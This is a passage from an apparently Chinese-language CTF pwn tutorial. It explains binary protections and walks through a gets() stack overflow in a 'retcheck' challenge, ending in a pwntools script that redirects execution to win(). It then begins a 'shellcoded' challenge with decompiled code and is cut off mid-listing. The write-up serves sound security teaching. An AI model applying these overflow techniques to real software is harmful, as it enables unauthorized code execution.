/img/posts/crystal/pwn-intro/retcheck-checksec-1280w.webp 1280w, /img/posts/crystal/pwn-intro/retcheck-checksec-840w.webp 840w, /img/posts/crystal/pwn-intro/retcheck-checksec-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-checksec-1920w.jpg 1920w, /img/posts/crystal/pwn-intro/retcheck-checksec-1280w.jpg 1280w, /img/posts/crystal/pwn-intro/retcheck-checksec-840w.jpg 840w, /img/posts/crystal/pwn-intro/retcheck-checksec-320w.jpg 320w" type="image/jpeg"><img src="/img/posts/crystal/pwn-intro/retcheck-checksec-1920w.jpg" height="260" width="358" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 358 260'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAHCAYAAADam2dgAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAz0lEQVQY0yWOW4qDQBBF3cbAQNT2me7WjNF8GCFGjUoeiMMEf7KB2f8CzrSZj6KgOHXutTo7pBJb+nXrA+040XQ3mv5BtM1whMZa5oX5OiF9bY57SpXTxjtGmVELSeQZ6Pv5YrjOpFmJE35ReIqzE3Ex5otJiFeoKCpcofCDlMBAOi/JupF9N5Acjog17lQPb8g1H16ckUcpJzNNqKl99R83TU/KqmVjx0hVGNORpKrfpX1XIfwE6+5J+kDTfdj8Li/Gxw+fmwgR7ow9wTXQHzdaZNVSh3ycAAAAAElFTkSuQmCC'%3E%3C/image%3E%3C/svg%3E&#34;)"></picture><figcaption><p>checksec</p></figcaption></figure><p></p><p>簡單介紹一下這幾種機制：</p><ul><li>canary: 一個放在 stack 上的隨機值，位置在 old rbp 跟 return address 之前，會在函數要結束的時候被檢查值是否被更動，作為判斷是否有 overflow 的依據。</li><li>fortify: 編譯時，compiler 會對可預知長度且與 libc 函數呼叫有關的變數做長度上限的檢查，如果執行時發現有越界的函數，就會程式就會強制結束</li><li>NX: <strong>N</strong>on-<strong>E</strong>xecutable，強制『可寫段不可執行，可執行段不可寫』的原則，也就是無法直接寫 shellcode 然後執行，以及不能竄改可執行的區段。</li><li>PIE: <strong>P</strong>osition <strong>I</strong>ndependent <strong>E</strong>xecutable，讓記憶體區段隨機分配，所以執行前沒辦法準確知道 base address 的位置，也就推算不出函數與變數的地址。</li><li>RELRO: <strong>Rel</strong>ocation <strong>R</strong>ead-<strong>O</strong>nly，代表 binary 中的 header 在 linker 執行完後會是 read-only，如果是 FULL RELRO 甚至連 GOT 表也會一開始填好並變成唯讀。</li></ul><p>這題只開了 NX 跟 RELRO，所以我們不能用 shellcode 或是 GOT hijacking （竄改 GOT 表把 libc 函數指向目標函數）的技巧。但是沒有開 PIE，所以表示檔案內函數的位置是固定的，我們可以從 debugger 裡面選某個好用適合的目標函數的位置然後把 return address 導過去。</p><p>我們用 <code>info functions</code> 看看有哪些函數：</p><p></p><figure><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-func-1920w.webp 1920w, /img/posts/crystal/pwn-intro/retcheck-func-1280w.webp 1280w, /img/posts/crystal/pwn-intro/retcheck-func-840w.webp 840w, /img/posts/crystal/pwn-intro/retcheck-func-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-func-1920w.jpg 1920w, /img/posts/crystal/pwn-intro/retcheck-func-1280w.jpg 1280w, /img/posts/crystal/pwn-intro/retcheck-func-840w.jpg 840w, /img/posts/crystal/pwn-intro/retcheck-func-320w.jpg 320w" type="image/jpeg"><img src="/img/posts/crystal/pwn-intro/retcheck-func-1920w.jpg" height="1232" width="1374" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 1374 1232'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAHCAYAAAA1WQxeAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAeklEQVQI12OwNHf9b2Xn9V9T2+S/orLOfyUVXRTMoGYZ81/HzPe/rbEBUEDvv7IqKgYqiP2vZeb339XC6L+qmh5YF0gCYYJFzH9toAI7E0OwAiwmxPzXMvX772xu+N/C0ACuG0OBqb4+1Ao9FEUQNwAVmAEVqCEpgGEAxsBWLbU5F90AAAAASUVORK5CYII='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture><figcaption><p>funcs</p></figcaption></figure><p></p><p><code>win()</code> 看起來特別有趣，簡單看一下會發現它就是讀取 <code>flag.txt</code> 然後印出 flag。也就是說我們只要能執行 <code>win()</code> 就成功了！</p><p></p><figure><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-win-1920w.webp 1920w, /img/posts/crystal/pwn-intro/retcheck-win-1280w.webp 1280w, /img/posts/crystal/pwn-intro/retcheck-win-840w.webp 840w, /img/posts/crystal/pwn-intro/retcheck-win-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-win-1920w.jpg 1920w, /img/posts/crystal/pwn-intro/retcheck-win-1280w.jpg 1280w, /img/posts/crystal/pwn-intro/retcheck-win-840w.jpg 840w, /img/posts/crystal/pwn-intro/retcheck-win-320w.jpg 320w" type="image/jpeg"><img src="/img/posts/crystal/pwn-intro/retcheck-win-1920w.jpg" height="1360" width="1208" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 1208 1360'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAcAAAAICAYAAAA1BOUGAAAACXBIWXMAABYlAAAWJQFJUiTwAAAArElEQVQI103Oyw6CMBCF4b6KioBXwLa0SBEtIRpNdOdKff+3+K2XGBez+ubMHNHOLJ3bkS8Uw2jxm9F4iVjqE1lzJZeO0m5JppJRnIWFOSJaXUjrB0XA1nkO/YmqbJhMLSKWZyb1HaUbrPH0/ogzNUmqEeMXrm9I5ShMR1l1rHLFIMr+MCS19ZjKM58V71KfswG1aTHrDlW2pGn+aRvLS8D7F3vqzT78dgwDPgHThVss80MwhgAAAABJRU5ErkJggg=='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture><figcaption><p>win</p></figcaption></figure><p></p><p>再來看看哪裡可以造成 overflow 呢？我們知道使用了 <code>gets()</code> 這個危險函數，而且 input 是 <code>[rbp-0x190]</code> 這個記憶體位置，所以字串 buffer 長度超過 0x190 就會溢出分配的空間，覆寫到後面的記憶體。</p><p>為了判斷多少字元會蓋過 return address，第一次練習，我們的策略是填滿字串 buffer 後每次多加 8 byte，看什麼時候會剛好觸發 abort，一般來說是看觸發 segmentation fault，但因為這裡的程式邏輯在結束前會先判斷 return address 是否被篡改，所以我們的輸入如果會造成 abort 就表示我們寫到 return address 啦！我們先手動創建一個非常長的字串，嘗試蓋過字串 buffer 後面的一格地址：<code>'A'*0x190 + 'B'*8</code>，然後跑起來輸入程式中。</p><p></p><figure><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-abort-1920w.webp 1920w, /img/posts/crystal/pwn-intro/retcheck-abort-1280w.webp 1280w, /img/posts/crystal/pwn-intro/retcheck-abort-840w.webp 840w, /img/posts/crystal/pwn-intro/retcheck-abort-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-abort-1920w.jpg 1920w, /img/posts/crystal/pwn-intro/retcheck-abort-1280w.jpg 1280w, /img/posts/crystal/pwn-intro/retcheck-abort-840w.jpg 840w, /img/posts/crystal/pwn-intro/retcheck-abort-320w.jpg 320w" type="image/jpeg"><img src="/img/posts/crystal/pwn-intro/retcheck-abort-1920w.jpg" height="332" width="2034" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 2034 332'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAADCAYAAABxhjRXAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAhElEQVQI133JSw6CMACE4d7FJ6DUVgmomBYDhqil8qhG4v2vMZYu3OHiy5/MkCKRyNIcUSywpjEo24Pxo+sg3CS2B3jBFpNZiOmcjiK67dGaD5quR928oR8v3FQHpY31dKqhlXH7fYz9iTxfIWQJkZXIC4WTuIDvUvirCAuPWfxn6f/3BYCkYK/4nFmTAAAAAElFTkSuQmCC'%3E%3C/image%3E%3C/svg%3E&#34;)"></picture><figcaption><p>abort</p></figcaption></figure><p></p><p>居然馬上就 abort 了，我們一次就蓋過去了嗎！</p><p>Nonono，這是個天大的誤會。我們再試一次，這次設一個斷點在判斷 abort 的地方：<code>&lt;vuln+108> cmp rdx, rax</code>，然後再跑一次，這次停在中斷點：</p><p></p><figure><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-break-1920w.webp 1920w, /img/posts/crystal/pwn-intro/retcheck-break-1280w.webp 1280w, /img/posts/crystal/pwn-intro/retcheck-break-840w.webp 840w, /img/posts/crystal/pwn-intro/retcheck-break-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-break-1920w.jpg 1920w, /img/posts/crystal/pwn-intro/retcheck-break-1280w.jpg 1280w, /img/posts/crystal/pwn-intro/retcheck-break-840w.jpg 840w, /img/posts/crystal/pwn-intro/retcheck-break-320w.jpg 320w" type="image/jpeg"><img src="/img/posts/crystal/pwn-intro/retcheck-break-1920w.jpg" height="1022" width="1390" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 1390 1022'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAHCAYAAADam2dgAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAr0lEQVQY0z2PWw6DIBBFWUqriKIgIPhqjLaamvSj+1/O7UDafpzcIcwcGObqDlL1yIVFpW+Qekz1n6IF02qDHXZM8x22m2HcjKK0yLhGTsRkunvAjwfCsFIDmZqAa66S4QdzytOkSQdBeckaXKnOvpZoY7Zb0EiPmhBmRkmp6YKTkdcBWTQd5xvrdkK5Cf2yw9gJkv5UyLhQQEWLsSc1bfsL2o1obUDT+jQdn+fCJD5zF2DWrBIwEQAAAABJRU5ErkJggg=='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture><figcaption><p>breakpoint</p></figcaption></figure><p></p><p>你會發現，預期儲存的地址是 <code>0x401465</code>，但實際拿到的卻是 <code>0x401400</code>，明明我們寫的是 'A' 呀，怎麼會有 null byte 呢？那是因為當你按下 [ENTER] 送出字串的時候，後面是會補一個 '\n' 的換行符號，也就是你送的實際上是 0x190 + 8 + 1 = 489 bytes 。而在程式中會把換行符號替換成 null byte，所以才會把 return address 的最後一個 byte 蓋過去。</p><p>到這裡，我們知道三件事：</p><ol><li>return address 的位置找到了，是 0x190 + 8 = 0x198 後的 8 個 bytes</li><li>return address 的值也知道了，是 <code>0x401465</code></li><li>目標函數是 <code>win()</code>，在 <code>0x4012e9</code> 的位置</li></ol><p>現在尷尬了，我們的目標是要把 return address 蓋成 <code>win()</code>，但這樣又會觸發檢查機制讓程式直接 abort，該如何避開呢？</p><p>你可以試試看，如果把 return address 放 <code>0x401465</code> 讓程式不要 abort 正常結束，然後從我們剛剛的中斷點開始逐步執行，你會發現程式是這樣執行的：正常離開 <code>vuln()</code> 之後會回到 <code>main()</code> 結尾的地方，這時會執行 <code>mov eax,0x0; pop rbp; ret;</code>，此時的 stack 接續著我們剛剛 <code>vuln()</code> 使用的空間，把 old rbp 還原並再次 return。對照著 <code>main()</code> 的 assembly，我們可以畫出 stack 的樣子：</p><p></p><figure><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-stack-1920w.webp 1920w, /img/posts/crystal/pwn-intro/retcheck-stack-1280w.webp 1280w, /img/posts/crystal/pwn-intro/retcheck-stack-840w.webp 840w, /img/posts/crystal/pwn-intro/retcheck-stack-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-stack-1920w.jpg 1920w, /img/posts/crystal/pwn-intro/retcheck-stack-1280w.jpg 1280w, /img/posts/crystal/pwn-intro/retcheck-stack-840w.jpg 840w, /img/posts/crystal/pwn-intro/retcheck-stack-320w.jpg 320w" type="image/jpeg"><img src="/img/posts/crystal/pwn-intro/retcheck-stack-1920w.jpg" height="689" width="650" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 650 689'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAYAAADED76LAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA2klEQVQY0zWK3U6CYABAv/d/iC67zYuG0t8ac5illIImA+HjT60gh4BUFCfW1tnOdi6OiHYZijblUn9CHRr0tQl3psd3C7Qtwg52nPRuOVWG9Mc2g3sHzYppfvhDJFnJRObMooJ5XGFuauZdV/UnTfPVDe9HRl6BEVWdR8Z+wSypWdku0vcRaZrhdeG4a8zFkiAIkEHI61vGIc8RzSGilNckloJv9EhtlTLW+Ud87CP2zg3yUWE1OmO7uKAIH9jEW+IkRhRZQPKsEi6vsKfnSGvAy1pHupIwCvkFhUvmTeVxePgAAAAASUVORK5CYII='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture><figcaption><p>call frames</p></figcaption></figure><p></p><p>所以雖然我們不能在 <code>vuln()</code> 裡直接蓋掉 return address，但只要往後多寫兩個，就可以蓋掉 <code>main()</code> 的 return address 啦！</p><p>至此這題差不多就結束了，我們可以用 python + pwntools 來寫 exploit</p><pre class="language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><br><br>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'DEBUG'</span><br><br>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./retcheck'</span><span class="token punctuation">)</span><br><span class="token comment">#p= remote('challenge.ctf.games', 31463)</span><br><br>retaddr <span class="token operator">=</span> <span class="token number">0x401465</span><br>win <span class="token operator">=</span> <span class="token number">0x4012e9</span><br><br>buf <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">408</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>retaddr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'B'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>win<span class="token punctuation">)</span><br><br>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><br>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><br>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>local 隨便創一個 flag.txt 來試試看，成功印出 flag！</p><p></p><figure><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-flag-1920w.webp 1920w, /img/posts/crystal/pwn-intro/retcheck-flag-1280w.webp 1280w, /img/posts/crystal/pwn-intro/retcheck-flag-840w.webp 840w, /img/posts/crystal/pwn-intro/retcheck-flag-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-flag-1920w.jpg 1920w, /img/posts/crystal/pwn-intro/retcheck-flag-1280w.jpg 1280w, /img/posts/crystal/pwn-intro/retcheck-flag-840w.jpg 840w, /img/posts/crystal/pwn-intro/retcheck-flag-320w.jpg 320w" type="image/jpeg"><img src="/img/posts/crystal/pwn-intro/retcheck-flag-1920w.jpg" height="870" width="1434" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 1434 870'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAGCAYAAAD68A/GAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAsUlEQVQI1x2OWbKCMBBFWcpTQTBkICRBREYtp0/3v5jzYj5OVXfVubc7e5mOz/xkuH2R7o5yGy5MuG7GtAP50SSyq7sybx98GFHKU6uOWjhkLrFNj+9vKH0mG6cH2/rG2CFy4SgCVWURe4H+hXRPXsTGqVuYlyetHylPLYdCs8tVRPN3kOwi+7hnPtba+JPSAVE7qpNNclE2id+cxCWeXM8r7eWdaMIdGcNChkRRmiT+A7g4Xn3w9iKRAAAAAElFTkSuQmCC'%3E%3C/image%3E%3C/svg%3E&#34;)"></picture><figcaption><p>flag</p></figcaption></figure><p></p><h2 id="simple-shellcode---shellcoded"><a href="#simple-shellcode---shellcoded" class="direct-link">#</a> Simple shellcode - shellcoded</h2><p>再來我們看個經典的 shellcode 題，題目你可以在<a href="https://github.com/OneDegree-Global/medium-resources/blob/main/pwn/shellcoded" rel="noopener noreferrer" target="_blank">這裡</a>下載。</p><p>shellcode 基本上就是可以直接執行、由組語指令轉成的一系列的 machine code。因為需要可寫與可執行的記憶體空間，這個技巧常用於 process injection 到沒有 NX 保護的檔案裡，可以輕鬆做到 RCE。</p><p>跑來跟剛剛類似，也是請你輸入一些東西，但這裡馬上就噴出了一個 segfault。</p><p></p><figure><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/shellcoded-run-1920w.webp 1920w, /img/posts/crystal/pwn-intro/shellcoded-run-1280w.webp 1280w, /img/posts/crystal/pwn-intro/shellcoded-run-840w.webp 840w, /img/posts/crystal/pwn-intro/shellcoded-run-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/shellcoded-run-1920w.jpg 1920w, /img/posts/crystal/pwn-intro/shellcoded-run-1280w.jpg 1280w, /img/posts/crystal/pwn-intro/shellcoded-run-840w.jpg 840w, /img/posts/crystal/pwn-intro/shellcoded-run-320w.jpg 320w" type="image/jpeg"><img src="/img/posts/crystal/pwn-intro/shellcoded-run-1920w.jpg" height="190" width="954" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 954 190'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAADCAYAAAB1c+RqAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAmElEQVQI11XOWQ6CMACEYW6itKCUrRsIFVOgMURtXO5/mbGiLz78+Z4mmcjJHrZs4EqNpWphDhPU6QlazaEJtBx/2qBDVhnUogeXBkoPYIVG1J7O+CTNDN6NaDqLutYgJAsxEMr+3JIcmzgPFmsxLRF5ZeBFh3t48mACnbZI2xcSeQtdvyqPVCwg/ILeehwHt47TvUCy43gDW+VQSvw4tusAAAAASUVORK5CYII='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture><figcaption><p>running shellcoded</p></figcaption></figure><p></p><p>發生什麼事了呢？這次我們用另一個很棒的<s>懶人</s>工具看看： Ghidra。Ghidra 是 NSA 開發的 reverse 工具，最爽的地方是可以讓買不起 IDA Pro 的人用 decompile 的功能，雖然不可能百分百還原（而且有時候 assembly 還好懂一點），但 Ghidra 還是我搭配 gdb 或 radare2 動態執行時常用的好夥伴。</p><p>跑起來大概會長這樣：</p><p></p><figure><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/shellcoded-ghidra-1920w.webp 1920w, /img/posts/crystal/pwn-intro/shellcoded-ghidra-1280w.webp 1280w, /img/posts/crystal/pwn-intro/shellcoded-ghidra-840w.webp 840w, /img/posts/crystal/pwn-intro/shellcoded-ghidra-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/shellcoded-ghidra-1920w.jpg 1920w, /img/posts/crystal/pwn-intro/shellcoded-ghidra-1280w.jpg 1280w, /img/posts/crystal/pwn-intro/shellcoded-ghidra-840w.jpg 840w, /img/posts/crystal/pwn-intro/shellcoded-ghidra-320w.jpg 320w" type="image/jpeg"><img src="/img/posts/crystal/pwn-intro/shellcoded-ghidra-1920w.jpg" height="1726" width="3118" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 3118 1726'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAGCAYAAAD68A/GAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAy0lEQVQI102MUUvCUACF7///IT2ED6MymDVSQoqi6KHm1U1z7m5eN7d5MefVQV8zeujA4ZwDH0dc9/p0nCucCxfX69N1e1x2b7nxBnh39wyGj5ydO4hsXVCVJYW2fB8gVYrtdsd/TcI5QiWGOFe8LEe8m5Dn4LXdEet6gbGGhiNv0kf4QUpaaPwsYlYnyFhSmQ27o8U29vfxYzxBaL0iy3KWseFr0xB9JlSVYb+31PUfOGrBojSMgym+DJFtnnq0SIjVySl6lTN8eOIH8Q3Z7jrrDjEAAAAASUVORK5CYII='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture><figcaption><p>shellcoded Ghidra</p></figcaption></figure><p></p><p>程式碼的部分整理一下，加一些註解跟換變數名稱，會長這樣：</p><pre class="language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span><br>    <span class="token keyword">char</span> cVar1<span class="token punctuation">;</span><br>    <span class="token keyword">int</span> mem_perm_result<span class="token punctuation">;</span><br>    code <span class="token operator">*</span>__buf<span class="token punctuation">;</span><br>    <span class="token class-name">size_t</span> buf_size<span class="token punctuation">;</span><br>    uint count<span class="token punctuation">;</span><br>    <br>    <span class="token comment">// allocate memory for buffer</span><br>    __buf <span class="token operator">=</span> <span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">aligned_alloc</span><span class="token punctuation">(</span>PAGE_SIZE<span class="token punctuation">,</span>PAGE_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span><br>    <span class="token keyword">if</span> <span class="token punctuation">(</span>__buf <span class="token operator">==</span> <span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><br>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"Failed to allocate memory.\n"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x1b</span><span class="token punctuation">,</span><span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>    <span class="token punctuation">}</span><br>    <br>    <span class="token comment">// read shellcode from user</span><br>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter your shellcode."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>    buf_size <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>__buf<span class="token punctuation">,</span>PAGE_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span><br><br>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&lt;</span> buf_size<span class="token punctuation">)</span> <span class="token punctuation">{</span><br><br>        <span class="token comment">// process shellcode</span><br>        <span class="token keyword">for</span> <span class="token punctuation">(</span>count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>count <span class="token operator">&lt;</span> buf_size<span class="token punctuation">;</span> count <span class="token operator">=</span> count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><br>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>count <span class="token operator">&</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><br>                cVar1 <span class="token operator">=</span> <span class="token string">'\x01'</span><span class="token punctuation">;</span><br>            <span class="token punctuation">}</span><br>            <span class="token keyword">else</span> <span class="token punctuation">{</span><br>                cVar1 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><br>            <span class="token punctuation">}</span><br>            __buf<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>count<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>__buf<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token 